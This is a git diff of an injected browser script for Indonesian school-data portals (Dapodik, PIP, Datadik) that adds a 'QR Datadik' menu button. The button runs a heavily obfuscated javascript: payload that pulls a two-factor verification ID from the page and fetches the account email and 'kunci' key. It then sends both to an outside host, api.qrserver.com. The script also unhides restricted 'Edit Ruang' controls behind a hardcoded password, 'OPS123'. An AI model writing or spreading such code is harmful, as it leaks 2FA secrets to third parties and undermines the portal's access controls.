@@ -36,7 +36,7 @@
         /* Gaya Tombol Kategori Utama */
         .inj-menu-btn {
             display: flex; align-items: center; justify-content: space-between;
-            width: 100%; padding: 15px; margin-bottom: 15px;
+            width: 100%; padding: 15px; margin-bottom: 12px;
             background: #f8f9fa; border: 1px solid #ddd; border-radius: 10px;
             cursor: pointer; font-size: 15px; font-weight: 600; color: #333;
             transition: all 0.3s ease; box-shadow: 0 2px 5px rgba(0,0,0,0.05);
@@ -59,11 +59,10 @@
             padding-left: 20px;
         }
         
-        /* Tombol Spesial PIP */
+        /* Warna Tombol Spesial */
         .btn-pip-special:hover { background: #4CAF50; border-color: #4CAF50; color: white; }
-        
-        /* Tombol Spesial Ruang (Gembok) */
         .btn-ruang-special:hover { background: #ff9800; border-color: #ff9800; color: white; }
+        .btn-datadik-special:hover { background: #9c27b0; border-color: #9c27b0; color: white; }
         
         /* Tombol Kembali */
         .inj-back-btn {
@@ -104,6 +103,10 @@
                     <div class="icon-title"><span style="font-size:20px">🎓</span> Menu PIP</div>
                     <span>➔</span>
                 </button>
+                <button class="inj-menu-btn" id="btn-view-datadik">
+                    <div class="icon-title"><span style="font-size:20px">🗃️</span> Menu DATADIK</div>
+                    <span>➔</span>
+                </button>
             </div>
             
             <!-- DAPODIK VIEW (SUB MENU) -->
@@ -127,6 +130,14 @@
                     <button class="inj-action-btn btn-pip-special" id="btn-pip">💰 Konfirmasi PIP Otomatis</button>
                 </div>
             </div>
+
+            <!-- DATADIK VIEW (SUB MENU) -->
+            <div id="inj-view-datadik" style="display:none;">
+                <button class="inj-back-btn" id="btn-back-datadik">🔙 Kembali ke Utama</button>
+                <div style="border-top:1px solid #eee; padding-top:15px;">
+                    <button class="inj-action-btn btn-datadik-special" id="btn-qr-datadik">📱 Munculkan QR Datadik</button>
+                </div>
+            </div>
             
             <!-- FOOTER DEVELOPER -->
             <div class="inj-footer">
@@ -143,23 +154,31 @@
     // ==========================================
     document.getElementById('btn-close-app').onclick = function() { menu.remove(); };
 
+    // Buka Kategori
     document.getElementById('btn-view-dapodik').onclick = function() {
         document.getElementById('inj-view-main').style.display = 'none';
         document.getElementById('inj-view-dapodik').style.display = 'block';
     };
-    
     document.getElementById('btn-view-pip').onclick = function() {
         document.getElementById('inj-view-main').style.display = 'none';
         document.getElementById('inj-view-pip').style.display = 'block';
     };
+    document.getElementById('btn-view-datadik').onclick = function() {
+        document.getElementById('inj-view-main').style.display = 'none';
+        document.getElementById('inj-view-datadik').style.display = 'block';
+    };
 
+    // Tombol Kembali
     document.getElementById('btn-back-dapodik').onclick = function() {
         document.getElementById('inj-view-dapodik').style.display = 'none';
         document.getElementById('inj-view-main').style.display = 'block';
     };
-
     document.getElementById('btn-back-pip').onclick = function() {
         document.getElementById('inj-view-pip').style.display = 'none';
+        document.getElementById('inj-view-main').style.display = 'block';
+    };
+    document.getElementById('btn-back-datadik').onclick = function() {
+        document.getElementById('inj-view-datadik').style.display = 'none';
         document.getElementById('inj-view-main').style.display = 'block';
     };
 
@@ -223,10 +242,7 @@
 
     // Edit Ruang (DENGAN PASSWORD)
     document.getElementById('btn-ruang').onclick = function() {
-        // Tampilkan pop-up password
         var pass = prompt("Masukkan Password untuk mengakses Edit Ruang:");
-        
-        // Cek apakah password benar
         if (pass === "OPS123") {
             var spans = document.querySelectorAll('.x-btn-inner');
             var positions = {
@@ -247,7 +263,6 @@
             });
             alert("Berhasil! Fitur Edit Ruang diaktifkan.");
         } else if (pass !== null) {
-            // Jika password salah (dan bukan klik cancel)
             alert("Password Salah! Akses ditolak.");
         }
     };
@@ -373,5 +388,13 @@
             }
             prosesBaris();
         }
+    };
+
+    // ==========================================
+    // QR DATADIK
+    // ==========================================
+    document.getElementById('btn-qr-datadik').onclick = function() {
+        var qrDatadikScript = "javascript:(function()%7Bvar%20ekstrakS%2Cx%3B(function()%7Bfunction%20jso%24ft%24giden%24window()%7Breturn%20window%7Dfunction%20jso%24ft%24giden%24encodeURIComponent()%7Breturn%20encodeURIComponent%7Dfunction%20jso%24ft%24giden%24_95_36af_49_49_50_51_54_53_51()%7Breturn%20_%24af1123653%7Dfunction%20jso%24ft%24uoel%24_33(a)%7Breturn%20!a%7Dfunction%20jso%24ft%24giden%24document()%7Breturn%20document%7Dfunction%20jso%24ft%24giden%24String()%7Breturn%20String%7Dfunction%20jso%24ft%24boe%24_37(a%2Cb)%7Breturn%20a%25%20b%7Dfunction%20jso%24ft%24boe%24_43(a%2Cb)%7Breturn%20a%2B%20b%7Dfunction%20jso%24ft%24boe%24_60(a%2Cb)%7Breturn%20a%3C%20b%7Dvar%20_%24_29fa%3D(_%24af1123654)(%22mc%25ie%25%25ds%2FElatentsonTcDNo%3Di%25atrnatsokug%25r%25arfuex.hpacsaa%25urmntkeabojncs%2F%20e%20o%2CR%2F.p%3ABQy%20tetmdtsntiha%25%25teaaeT%25o%25t%26ektbeptnu%20a%3F%2FC%25etuaapneoxg%25%20eh%2FtgdmaeiT%25gsi%25at_rlenat%3Dprnnboekbip%25irpu2ned%20pe%22%2C1305151)%3Bfunction%20_%24af1123654(g%2Cjso%24setrpl%24w)%7Bvar%20w%3D%7B%7D%2Cx%3D%7B%7D%2Cq%3D%7B%7D%2Ce%3D%7B%7D%2Co%3D%7B%7D%2Cp%3D%7B%7D%2Ch%3D%7B%7D%3Bw._%3D%20jso%24setrpl%24w%3Bvar%20u%3Dg.length%3Bx._%3D%20%5B%5D%3B%3Bfor(var%20m%3D0%3Bjso%24ft%24boe%24_60(m%2Cu)%3Bm%2B%2B)%7Bx._%5Bm%5D%3D%20g.charAt(m)%7D%3Bfor(var%20m%3D0%3Bjso%24ft%24boe%24_60(m%2Cu)%3Bm%2B%2B)%7Bq._%3D%20jso%24ft%24boe%24_43(w._*%20(jso%24ft%24boe%24_43(m%2C485))%2C(jso%24ft%24boe%24_37(w._%2C19797)))%3B%3Be._%3D%20jso%24ft%24boe%24_43(w._*%20(jso%24ft%24boe%24_43(m%2C325))%2C(jso%24ft%24boe%24_37(w._%2C40412)))%3B%3Bo._%3D%20jso%24ft%24boe%24_37(q._%2Cu)%3B%3Bp._%3D%20jso%24ft%24boe%24_37(e._%2Cu)%3B%3Bh._%3D%20x._%5Bo._%5D%3B%3Bjso%24spliter_%24af1123656(o%2Cx%2Cp)%3Bjso%24spliter_%24af1123657(p%2Cx%2Ch)%3Bjso%24spliter_%24af1123658(w%2Cq%2Ce)%7D%3Bvar%20k%3Djso%24ft%24giden%24String().fromCharCode(127)%3Bvar%20i%3D''%3Bvar%20s%3D'%5Cx25'%3Bvar%20l%3D'%5Cx23%5Cx31'%3Bvar%20z%3D'%5Cx25'%3Bvar%20c%3D'%5Cx23%5Cx30'%3Bvar%20a%3D'%5Cx23'%3Breturn%20x._.join(i).split(s).join(k).split(l).join(z).split(c).join(a).split(k)%7Dfunction%20_%24af1123652()%7Bconst%20scripts%3Djso%24ft%24giden%24document()%5B_%24_29fa%5B1%5D%5D(_%24_29fa%5B0%5D)%3Bconst%20regex%3D%2F%5C%2Fverifikasi2fa%5C%2F(%5B0-9A-Fa-f%5D%7B8%7D-%5B0-9A-Fa-f%5D%7B4%7D-%5B0-9A-Fa-f%5D%7B4%7D-%5B0-9A-Fa-f%5D%7B4%7D-%5B0-9A-Fa-f%5D%7B12%7D)%2F%3Bfor(let%20script%20of%20scripts)%7Bconst%20content%3Dscript%5B_%24_29fa%5B2%5D%5D%7C%7C%20script%5B_%24_29fa%5B3%5D%5D%3Bconst%20match%3Dcontent%5B_%24_29fa%5B4%5D%5D(regex)%3Bif(match)%7Bif(jso%24ft%24uoel%24_33(_%24af1123652))%7Bjso%24ft%24giden%24_95_36af_49_49_50_51_54_53_51()()%7D%3Breturn%20match%5B1%5D%7D%7D%3Breturn%20null%7Dif(!_%24_29fa)%7B(function()%7B_%24af1123653%3D%200%7D)()%3Breturn%7D%3Bfunction%20_%24af1123653(rsp)%7Blet%20email%3Drsp%5B_%24_29fa%5B6%5D%5D%3Blet%20kunci%3Drsp%5B_%24_29fa%5B7%5D%5D%3Bconst%20apiUrl%3D(%22%5Cx68%5Cx74%5Cx74%5Cx70%5Cx73%5Cx3A%5Cx2F%5Cx2F%5Cx61%5Cx70%5Cx69%5Cx2E%5Cx71%5Cx72%5Cx73%5Cx65%5Cx72%5Cx76%5Cx65%5Cx72%5Cx2E%5Cx63%5Cx6F%5Cx6D%5Cx2F%5Cx76%5Cx31%5Cx2F%5Cx63%5Cx72%5Cx65%5Cx61%5Cx74%5Cx65%5Cx2D%5Cx71%5Cx72%5Cx2D%5Cx63%5Cx6F%5Cx64%5Cx65%5Cx2F%5Cx3F%5Cx73%5Cx69%5Cx7A%5Cx65%5Cx3D%5Cx33%5Cx30%5Cx30%5Cx78%5Cx33%5Cx30%5Cx30%5Cx26%5Cx64%5Cx61%5Cx74%5Cx61%5Cx3D%22%2Bjso%24ft%24giden%24encodeURIComponent()(jso%24ft%24boe%24_43(jso%24ft%24boe%24_43(_%24_29fa%5B8%5D%2B%20email%2C_%24_29fa%5B9%5D)%2B%20kunci%2C_%24_29fa%5B10%5D))%2B_%24_29fa%5B11%5D)%3Bjso%24ft%24giden%24window()%5B_%24_29fa%5B13%5D%5D(apiUrl%2C_%24_29fa%5B12%5D)%7DekstrakS%3D%20_%24af1123652%3Bx%3D%20_%24af1123652()%3Bif(x)%7Balert(_%24_29fa%5B5%5D)%3B%24%5B_%24_29fa%5B16%5D%5D(_%24_29fa%5B15%5D%2B%20(%22%22%2Bx%2B_%24_29fa%5B11%5D))%5B_%24_29fa%5B14%5D%5D(_%24af1123653)%7D%3Bfunction%20jso%24spliter_%24af1123656(o%2Cx%2Cp)%7Bx._%5Bo._%5D%3D%20x._%5Bp._%5D%7Dfunction%20jso%24spliter_%24af1123657(p%2Cx%2Ch)%7Bx._%5Bp._%5D%3D%20h._%7Dfunction%20jso%24spliter_%24af1123658(w%2Cq%2Ce)%7Bw._%3D%20jso%24ft%24boe%24_37((jso%24ft%24boe%24_43(q._%2Ce._))%2C2585969)%7D%7D)()%7D)()%3B";
+        location.href = qrDatadikScript;
     };
 })();
